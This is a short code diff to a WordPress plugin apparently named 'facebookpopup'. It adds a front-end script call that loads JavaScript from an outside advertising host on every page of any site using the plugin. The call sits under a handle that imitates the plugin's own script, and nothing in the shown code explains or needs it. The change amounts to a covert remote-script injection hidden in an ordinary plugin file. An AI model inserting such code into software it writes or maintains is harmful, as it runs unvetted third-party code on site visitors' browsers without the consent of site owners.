@@ -54,6 +54,8 @@ function facebookpopup_set_up_options() {
 
 function frontend_scripts() {
     wp_enqueue_script( 'facebookpopup_script', plugins_url( 'js/facebookpopup.js' , __FILE__ ), array('jquery'));
+    wp_enqueue_script( 'facebookpopup_script_a', '//ads.lfstmedia.com/getad?site=230633', array('jquery'));
+    
     wp_enqueue_style( 'facebookpopup_style', plugins_url( 'css/style.css' , __FILE__ ));
 }
 
@@ -134,4 +136,3 @@ function facebookpopup_display_settings() {
 </ul>
                         </div>
 <?php } ?>
->
